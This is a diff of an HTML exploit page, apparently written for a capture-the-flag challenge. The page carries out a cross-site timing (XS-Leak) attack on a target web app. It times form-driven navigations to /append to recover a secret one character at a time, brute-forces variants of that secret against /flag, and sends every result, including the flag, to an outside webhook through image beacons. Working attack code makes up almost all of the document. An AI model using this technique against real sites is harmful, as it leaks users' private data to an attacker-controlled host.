@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><title>XS-Leak Final</title></head>
+<head><title>Combined Attack</title></head>
 <body>
 <div id="s">Loading...</div>
 <script>
@@ -13,12 +13,12 @@ function report(msg) {
     new Image().src = WEBHOOK + "?m=" + encodeURIComponent(msg);
 }
 
-report("LOAD");
+report("COMBO_V1");
 
-// Navigate via form and measure time
-function navigate(content) {
+// Test single prefix via form navigation
+function testPrefix(prefix) {
     return new Promise(function(resolve) {
-        var url = TARGET + "/append?content=" + encodeURIComponent(content) + "&url=" + encodeURIComponent(TARGET + "/");
+        var url = TARGET + "/append?content=" + encodeURIComponent(prefix) + "&url=" + encodeURIComponent(TARGET + "/?r=" + Math.random());
         var wname = "w" + Math.random().toString(36).slice(2);
         
         var form = document.createElement("form");
@@ -35,53 +35,79 @@ function navigate(content) {
             var elapsed = performance.now() - t0;
             try { window.open("", wname).close(); } catch(e) {}
             resolve(elapsed);
-        }, 200);
+        }, 250);
     });
+}
+
+async function trySecret(secret) {
+    try {
+        var resp = await fetch(TARGET + "/flag?secret=" + secret);
+        var text = await resp.text();
+        if (text.indexOf("lactf") !== -1) {
+            report("FLAG=" + text);
+            document.getElementById("s").textContent = text;
+            return true;
+        }
+    } catch(e) {}
+    return false;
 }
 
 async function main() {
     report("START");
-    document.getElementById("s").textContent = "Polluting...";
     
     try {
-        // Step 1: Pollute notes with garbage to amplify timing difference
-        // Use strings that won't match any hex prefix (start with Z)
-        for (var i = 0; i < 50; i++) {
-            await navigate("ZZZZ" + i);
-        }
-        report("POLLUTED");
+        // Phase 1: Timing attack to get candidate secret
+        document.getElementById("s").textContent = "Phase 1: Timing...";
         
-        // Step 2: Now do timing attack - 200 will short-circuit on SECRET, 404 must check all 101 notes
-        var secret = "";
+        var secretFast = "";
+        var secretSlow = "";
+        var allData = [];
         
         for (var pos = 0; pos < 8; pos++) {
-            document.getElementById("s").textContent = "P" + pos;
-            
+            document.getElementById("s").textContent = "T" + pos;
             var results = [];
+            
             for (var i = 0; i < CHARS.length; i++) {
                 var c = CHARS[i];
-                var time = await navigate(secret + c);
+                var time = await testPrefix(secretFast + c);
                 results.push({ c: c, time: time });
             }
             
-            results.sort(function(a, b) { return a.time - b.time; });
+            results.sort(function(a,b) { return a.time - b.time; });
+            allData.push(results);
             
-            var fast = results[0];
-            var slow = results[results.length - 1];
+            secretFast += results[0].c;
+            secretSlow += results[results.length - 1].c;
             
-            report("P" + pos + ":F=" + fast.c + "(" + Math.round(fast.time) + ")S=" + slow.c + "(" + Math.round(slow.time) + ")");
-            
-            // Correct char should be FASTEST (200 short-circuits on first note = SECRET)
-            secret += fast.c;
+            report("P" + pos + ":" + results[0].c + "-" + results[results.length-1].c);
         }
         
-        report("SECRET=" + secret);
+        report("TF=" + secretFast);
+        report("TS=" + secretSlow);
         
-        var resp = await fetch(TARGET + "/flag?secret=" + secret);
-        var flag = await resp.text();
-        report("FLAG=" + flag);
+        // Phase 2: Try direct secrets
+        document.getElementById("s").textContent = "Phase 2: Testing...";
+        if (await trySecret(secretFast)) return;
+        if (await trySecret(secretSlow)) return;
         
-        document.getElementById("s").textContent = flag;
+        // Phase 3: Bruteforce single-char variations
+        document.getElementById("s").textContent = "Phase 3: Bruteforce...";
+        
+        var bases = [secretFast, secretSlow];
+        for (var b = 0; b < bases.length; b++) {
+            var base = bases[b];
+            for (var pos = 0; pos < 8; pos++) {
+                for (var i = 0; i < CHARS.length; i++) {
+                    var c = CHARS[i];
+                    if (base[pos] === c) continue;
+                    var variant = base.substr(0, pos) + c + base.substr(pos + 1);
+                    if (await trySecret(variant)) return;
+                }
+            }
+        }
+        
+        report("NOFLAG");
+        document.getElementById("s").textContent = "Not found";
         
     } catch(e) {
         report("ERR=" + e.message);
